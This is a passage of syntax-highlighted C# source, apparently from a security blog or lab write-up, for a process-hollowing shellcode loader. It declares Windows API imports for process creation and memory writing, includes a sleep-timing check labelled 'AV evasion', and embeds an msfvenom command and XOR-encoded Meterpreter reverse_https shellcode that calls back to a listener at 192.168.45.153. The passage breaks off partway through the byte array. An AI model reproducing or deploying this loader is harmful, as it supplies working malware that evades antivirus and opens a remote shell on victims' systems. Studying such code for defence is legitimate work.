style="color:#7f0044;font-weight:400">uint</span> dwXCountChars;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwYCountChars;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwFillAttribute;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">uint</span> dwFlags;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">short</span> wShowWindow;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">short</span> cbReserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr lpReserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdInput;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdOutput;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdError;<br />        }<br /><br />        [StructLayout(LayoutKind.Sequential)]<br />        <span style="color:#ff9d00;font-weight:700">internal</span> <span style="color:#ff9d00;font-weight:700">struct</span> ProcessBasicInfo<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr Reserved1;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr PebAddress;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr Reserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr Reserved3;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr UniquePid;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr MoreReserved;<br />        }<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#ff9d00;font-weight:700">void</span> Sleep(<span style="color:#7f0044;font-weight:400">uint</span> dwMilliseconds);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, CharSet = CharSet.Ansi)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> CreateProcess(<span style="color:#7f0044;font-weight:400">string</span> lpApplicationName, <span style="color:#7f0044;font-weight:400">string</span> lpCommandLine, IntPtr lpProcessAttributes,<br />            IntPtr lpThreadAttributes, <span style="color:#7f0044;font-weight:400">bool</span> bInheritHandles, <span style="color:#7f0044;font-weight:400">uint</span> dwCreationFlags, IntPtr lpEnvironment, <span style="color:#7f0044;font-weight:400">string</span> lpCurrentDirectory,<br />            [In] <span style="color:#ff9d00;font-weight:700">ref</span> StartupInfo lpStartupInfo, <span style="color:#ff9d00;font-weight:700">out</span> ProcessInfo lpProcessInformation);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;ntdll.dll&quot;</span>, CallingConvention = CallingConvention.StdCall)]<br />        <span style="color:#ff9d00;font-weight:700">private</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">int</span> ZwQueryInformationProcess(IntPtr hProcess, <span style="color:#7f0044;font-weight:400">int</span> procInformationClass,<br />            <span style="color:#ff9d00;font-weight:700">ref</span> ProcessBasicInfo procInformation, <span style="color:#7f0044;font-weight:400">uint</span> ProcInfoLen, <span style="color:#ff9d00;font-weight:700">ref</span> <span style="color:#7f0044;font-weight:400">uint</span> retlen);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] <span style="color:#7f0044;font-weight:400">byte</span>[] lpBuffer,<br />            <span style="color:#7f0044;font-weight:400">int</span> dwSize, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr lpNumberOfbytesRW);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, <span style="color:#7f0044;font-weight:400">byte</span>[] lpBuffer, Int32 nSize, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr lpNumberOfBytesWritten);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">uint</span> ResumeThread(IntPtr hThread);<br /><br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            <span style="color:#0088ff;font-weight:400">// AV evasion: Sleep for 10s and detect if time really passed</span><br />            DateTime t1 = DateTime.Now;<br />            Sleep(<span style="color:#ff0044;font-weight:400">10000</span>);<br />            <span style="color:#7f0044;font-weight:400">double</span> deltaT = DateTime.Now.Subtract(t1).TotalSeconds;<br />            <span style="color:#ff9d00;font-weight:700">if</span> (deltaT &lt; <span style="color:#ff0044;font-weight:400">9.5</span>)<br />            {<br />                <span style="color:#ff9d00;font-weight:700">return</span>;<br />            }<br /><br />            <span style="color:#0088ff;font-weight:400">// sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.153 LPORT=443 EXITFUNC=thread -f csharp --encrypt=xor --encrypt-key=&quot;f&quot;</span><br /><br />            <span style="color:#7f0044;font-weight:400">byte</span>[] buf = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">511</span>] {<span style="color:#ff0044;font-weight:400">0x9a</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xe5</span>,<span style="color:#ff0044;font-weight:400">0x82</span>,<span style="color:#ff0044;font-weight:400">0x96</span>,<span style="color:#ff0044;font-weight:400">0x8e</span>,<br /><span style="color:#ff0044;font-weight:400">0xaa</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<br /><span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<span style="color:#ff0044;font-weight:400">0x03</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x06</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x7e</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<br /><span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x46</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x14</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x69</span>,<span style="color:#ff0044;font-weight:400">0xd1</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<br /><span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0xaf</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0xca</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x07</span>,<span style="color:#ff0044;font-weight:400">0x1a</span>,<span style="color:#ff0044;font-weight:400">0x64</span>,<span style="color:#ff0044;font-weight:400">0x4a</span>,<br /><span style="color:#ff0044;font-weight:400">0x46</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xa7</span>,<span style="color:#ff0044;font-weight:400">0xaf</span>,<span style="color:#ff0044;font-weight:400">0x6b</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xa7</span>,<span style="color:#ff0044;font-weight:400">0x84</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<br /><span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x46</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x24</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xb6</span>,<span style="color:#ff0044;font-weight:400">0x00</span>,<br /><span style="color:#ff0044;font-weight:400">0xe7</span>,<span style="color:#ff0044;font-weight:400">0x1e</span>,<span style="color:#ff0044;font-weight:400">0x7e</span>,<span style="color:#ff0044;font-weight:400">0x6d</span>,<span style="color:#ff0044;font-weight:400">0x64</span>,<span style="color:#ff0044;font-weight:400">0x69</span>,<span style="color:#ff0044;font-weight:400">0xe3</span>,<span style="color:#ff0044;font-weight:400">0x14</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<br /><span style="color:#ff0044;font-weight:400">0xe6</span>,<span style="color:#ff0044;font-weight:400">0xee</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xe3</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0x12</span>,<span style="color:#ff0044;font-weight:400">0x01</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<br /><span style="color:#ff0044;font-weight:400">0xb6</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x7e</span>,<span style="color:#ff0044;font-weight:400">0x22</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x26</span>,<span style="color:#ff0044;font-weight:400">0x46</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xb6</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<br /><span style="color:#ff0044;font-weight:400">0x85</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xaf</span>,<span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0xaf</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0xee</span>,<br /><span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xb0</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xa7</span>,<span style="color:#ff0044;font-weight:400">0xaf</span>,<span style="color:#ff0044;font-weight:400">0x6b</span>,<span style="color:#ff0044;font-weight:400">0xca</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<br /><span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xa7</span>,<span style="color:#ff0044;font-weight:400">0x5e</span>,<span style="color:#ff0044;font-weight:400">0x86</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x97</span>,<span style="color:#ff0044;font-weight:400">0x2a</span>,<span style="color:#ff0044;font-weight:400">0x65</span>,<span style="color:#ff0044;font-weight:400">0x2a</span>,<span style="color:#ff0044;font-weight:400">0x42</span>,<span style="color:#ff0044;font-weight:400">0x6e</span>,<span style="color:#ff0044;font-weight:400">0x23</span>,<br /><span style="color:#ff0044;font-weight:400">0x5f</span>,<span style="color:#ff0044;font-weight:400">0xb7</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0xbe</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x22</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x26</span>,<span style="color:#ff0044;font-weight:400">0x42</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xb6</span>,<br /><span style="color:#ff0044;font-weight:400">0x00</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x6a</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x22</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x26</span>,<span style="color:#ff0044;font-weight:400">0x7a</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xb6</span>,<br /><span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x62</span>,<span style="color:#ff0044;font-weight:400">0xee</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xb6</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<br /><span style="color:#ff0044;font-weight:400">0x3f</span>,<span style="color:#ff0044;font-weight:400">0x3c</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3f</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3c</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xe5</span>,<span style="color:#ff0044;font-weight:400">0x8a</span>,<span style="color:#ff0044;font-weight:400">0x46</span>,<br /><span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0x86</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3f</span>,<span style="color:#ff0044;font-weight:400">0x3c</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x74</span>,<span style="color:#ff0044;font-weight:400">0x8f</span>,<br /><span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0xd8</span>,<span style="color:#ff0044;font-weight:400">0x11</span>,<span style="color:#ff0044;font-weight:400">0x15</span>,<span style="color:#ff0044;font-weight:400">0x54</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x55</span>,<br /><span style="color:#ff0044;font-weight:400">0x54</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x80</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xe7</span>,<span style="color:#ff0044;font-weight:400">0x8a</span>,<span style="color:#ff0044;font-weight:400">0xc6</span>,<br /><span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0xda</span>,<span style="color:#ff0044;font-weight:400">0x64</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xdd</span>,<br /><span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0xce</span>,<span style="color:#ff0044;font-weight:400">0x4b</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x82</span>,<span style="color:#ff0044;font-weight:400">0x2a</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x97</span>,<br /><span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xdc</span>,<span style="color:#ff0044;font-weight:400">0x2a</span>,<span style="color:#ff0044;font-weight:400">0x11</span>,<span style="color:#ff0044;font-weight:400">0x40</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0x2a</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x8c</span>,<span style="color:#ff0044;font-weight:400">0x0e</span>,<br /><span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x3f</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xdc</span>,<span style="color:#ff0044;font-weight:400">0x4f</span>,<span style="color:#ff0044;font-weight:400">0xe6</span>,<span style="color:#ff0044;font-weight:400">0x0d</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<br /><span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0x0c</span>,<span style="color:#ff0044;font-weight:400">0x6c</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0xaf</span>,<span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<br /><span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0xa4</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<br /><span style="color:#ff0044;font-weight:400">0xa7</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xdc</span>,<span style="color:#ff0044;font-weight:400">0x8c</span>,<span style="color:#ff0044;font-weight:400">0x69</span>,<span style="color:#ff0044;font-weight:400">0xb9</span>,<span style="color:#ff0044;font-weight:400">0x86</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<br /><span style="color:#ff0044;font-weight:400">0x0c</span>,<span style="color:#ff0044;font-weight:400">0x76</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x2a</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x84</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x9f</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xdc</span>,<br /><span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xc3</span>,<span style="color:#ff0044;font-weight:400">0x12</span>,<span style="color:#ff0044;font-weight:400">0x07</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0xe3</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0x12</span>,<span style="color:#ff0044;font-weight:400">0x6c</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<br /><span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0x8e</span>,<span style="color:#ff0044;font-weight:400">0xf5</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xe5</span>,<span style="color:#ff0044;font-weight:400">0x8a</span>,<span style="color:#ff0044;font-weight:400">0x76</span>,<br /><span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x84</span>,<span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0xaf</span>,<span style="color:#ff0044;font-weight:400">0x0c</span>,<span style="color:#ff0044;font-weight:400">0x62</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<br /><span style="color:#ff0044;font-weight:400">0x9f</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xdc</span>,<span style="color:#ff0044;font-weight:400">0x64</span>,<span style="color:#ff0044;font-weight:400">0xbf</span>,<span style="color:#ff0044;font-weight:400">0xae</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0xe5</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<br /><span style="color:#ff0044;font-weight:400">0x18</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xe5</span>,<span style="color:#ff0044;font-weight:400">0xa2</span>,<span style="color:#ff0044;font-weight:400">0x46</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x90</span>,<span style="color:#ff0044;font-weight:400">0x0c</span>,<span style="color:#ff0044;font-weight:400">0x26</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<br /><span style="color:#ff0044;font-weight:400">0x3f</span>,<span style="color:#ff0044;font-weight:400">0x0e</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x76</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x94</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<br /><span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0xaf</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xdc</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0xc2</span>,<span style="color:#ff0044;font-weight:400">0x35</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<br /><span style="color:#ff0044;font-weight:400">0xa5</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0xaf</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x96</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<br /><span style="color:#ff0044;font-weight:400">0xbc</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0x9f</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xdc</span>,<span style="color:#ff0044;font-weight:400">0x64</span>,<span style="color:#ff0044;font-weight:400">0xbf</span>,<span style="color:#ff0044;font-weight:400">0xae</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xb3</span>,<br /><span style="color:#ff0044;font-weight:400">0xe5</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span 